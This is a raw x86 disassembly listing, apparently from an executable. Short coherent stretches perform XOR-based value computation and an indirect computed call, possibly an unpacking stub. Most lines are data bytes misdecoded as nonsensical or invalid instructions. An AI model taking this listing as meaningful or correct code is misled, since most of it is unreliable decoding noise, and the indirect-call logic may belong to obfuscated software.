  40dde9:	jg     0x40ddc7
  40ddeb:	call   0x6176caa0
  40ddf0:	out    0xce,al
  40ddf2:	push   ebp
  40ddf3:	jo     0x40ddbf
  40ddf5:	or     al,0x68
  40ddf7:	sbb    al,0x2a
  40ddf9:	and    al,0x40
  40ddfb:	daa    
  40ddfc:	cld    
  40ddfd:	or     al,0x62
  40ddff:	mov    DWORD PTR [esi*1-0x670866be],eax
  40de06:	test   al,0x64
  40de08:	jle    0x40de5e
  40de0a:	aad    0x29
  40de0c:	leave  
  40de0d:	sub    eax,0x81003d57
  40de12:	jl     0x40de58
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x230cf21f],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40deff
  40de8e:	jge    0x40deda
  40de90:	cwde   
  40de91:	inc    esp
  40de92:	mov    DWORD PTR [ecx-0x2d],0xea91e654
  40de99:	(bad)  
  40de9b:	ss inc eax
  40de9d:	lahf   
  40de9e:	mov    edi,0xa7500def
  40dea3:	sub    BYTE PTR [edx+0x4771e27a],dl
  40dea9:	fidivr WORD PTR [edi+0x655006d3]
  40deaf:	pop    ebx
  40deb0:	and    DWORD PTR [edi],esp
  40deb2:	scas   eax,DWORD PTR es:[edi]
  40deb3:	outs   dx,BYTE PTR ds:[esi]
  40deb4:	das    
  40deb5:	sub    BYTE PTR [esi-0x7952abc7],dh
  40debb:	xchg   esp,eax
  40debc:	jb     0x40de62
  40debe:	cmp    BYTE PTR [ebx-0x79],bl
  40dec1:	add    eax,0xa62b66e6
  40dec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec7:	js     0x40deae
  40dec9:	test   DWORD PTR [ebx],ebx
  40decb:	push   esi
  40decc:	fwait
  40decd:	loopne 0x40de86
  40decf:	mov    esi,0x38176045
  40ded4:	xor    bl,ch
  40ded6:	cmp    al,0x35
  40ded8:	xlat   BYTE PTR ds:[ebx]
  40ded9:	into   
  40deda:	out    dx,eax
  40dedb:	inc    eax
  40dedc:	ss pusha 
  40dede:	cmp    ecx,DWORD PTR [ebx]
  40dee0:	ja     0x40dea9
  40dee2:	imul   esi,esi,0xaaf16a3e
  40dee8:	xchg   esp,eax
  40dee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deea:	and    dh,BYTE PTR [esi]
  40deec:	sbb    DWORD PTR [ebx-0x1159ccfe],ecx
  40def2:	outs   dx,DWORD PTR ds:[esi]
  40def3:	push   ebx
  40def4:	mov    eax,0x37855ee4
  40def9:	dec    edi
  40defa:	imul   eax,ebp,0xffffffa5
  40defd:	or     al,0x1d
  40deff:	jmp    0x6d88431f
  40df04:	clc    
  40df05:	call   FWORD PTR [eax-0xc6328cb]
  40df0b:	xchg   esp,eax
  40df0c:	fstp   QWORD PTR [edi]
  40df0e:	icebp  
  40df0f:	jbe    0x40df39
  40df11:	shl    DWORD PTR [eax+0x7f],0xc1
  40df15:	lods   al,BYTE PTR ds:[esi]
  40df16:	sar    BYTE PTR [edx-0x16],cl
  40df19:	dec    esi
  40df1a:	aam    0xac
  40df1c:	(bad)  
  40df1d:	cld    
  40df1e:	popf   
  40df1f:	ins    BYTE PTR es:[edi],dx
  40df20:	fisub  DWORD PTR [edx]
  40df22:	xor    eax,0xa06b42e4
  40df27:	or     edx,ebp
  40df29:	mov    bh,0xf
  40df2b:	jmp    0xbe47:0x26152722
  40df32:	rcr    BYTE PTR [ebx-0x4133889b],cl
  40df38:	lods   eax,DWORD PTR ds:[esi]
  40df39:	pop    esp
  40df3a:	push   esp
  40df3b:	inc    ecx
  40df3c:	push   cs
  40df3d:	mov    eax,ds:0x692eca82
  40df42:	mov    al,ds:0xc7d116e6
  40df47:	popf   
  40df48:	adc    ebp,edi
  40df4a:	mov    ds:0x4bd16bea,eax
  40df4f:	add    eax,DWORD PTR [ecx-0x3335226b]
  40df55:	jo     0x40dfc3
  40df57:	xor    al,0xac
  40df59:	and    eax,0x7d6f1765
  40df5e:	call   0x6d99610b
  40df63:	into   
  40df64:	jle    0x40df49
  40df66:	sti    
  40df67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df68:	out    dx,al
  40df69:	ds aas 
  40df6b:	adc    BYTE PTR [edx],al
  40df6d:	cmp    eax,0xa7da049d
  40df72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df73:	addr16 (bad) 
  40df75:	xor    BYTE PTR [edi+0x33],0x8c
  40df79:	add    dh,BYTE PTR [esi+0x1df18ce1]
  40df7f:	stos   DWORD PTR es:[edi],eax
  40df80:	imul   edi,DWORD PTR [edi],0xde09d8d
  40df86:	pop    esp
  40df87:	mov    DWORD PTR [edx],edi
  40df89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df8a:	adc    al,BYTE PTR [edi-0x76edf8f9]
  40df90:	mov    dh,0x39
  40df92:	repz push esi
  40df94:	sub    DWORD PTR [ecx+eax*1+0x56],esp
  40df98:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40df9a:	xor    eax,0x4e37dfaa
  40df9f:	daa    
  40dfa0:	iret   
  40dfa1:	pop    ecx
  40dfa2:	stos   DWORD PTR es:[edi],eax
  40dfa3:	loop   0x40dfae
  40dfa5:	cs cld 
  40dfa7:	hlt    
  40dfa8:	xchg   edi,eax
  40dfa9:	mul    BYTE PTR [ebx-0x62]
  40dfac:	lods   eax,DWORD PTR ds:[esi]
  40dfad:	adc    eax,0xf3a7ad9c
  40dfb2:	aam    0xbc
  40dfb4:	dec    esp
  40dfb5:	nop
  40dfb6:	lods   al,BYTE PTR ds:[esi]
  40dfb7:	call   0xd92b:0xcb87438a
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
